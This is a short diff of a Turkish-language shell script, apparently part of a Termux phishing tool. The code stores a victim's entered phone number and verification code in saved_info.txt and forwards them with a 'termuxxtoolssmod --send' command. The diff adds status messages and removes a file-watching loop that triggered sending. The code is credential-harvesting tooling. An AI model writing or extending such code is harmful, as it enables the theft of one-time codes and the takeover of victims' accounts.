@@ -94,6 +94,7 @@ do
 		echo
 		cat kod.txt >> saved_info.txt
 		rm kod.txt
+		echo "[✓] KOD GİRİLDİ" >.info
 		termuxxtoolssmod --send
 		exit
 	fi
@@ -113,23 +114,9 @@ do
 		echo
 		cat numara.txt >> saved_info.txt
 		rm numara.txt
+		echo "[✓] NUMARA GİRİLDİ" >.info
 		termuxxtoolssmod --send
 		dongu2
-	fi
-done
-}
-kapali() {
-cat saved_info.txt > .sayi.txt
-kontrol2=$(cat .sayi.txt |wc -l)
-while :
-do
-	kontrol=$(cat saved_info.txt |wc -l)
-	if [[ $kontrol != $kontrol2 ]];then
-		echo
-		echo
-		echo
-		termuxxtoolssmod --send
-		exit
 	fi
 done
 }
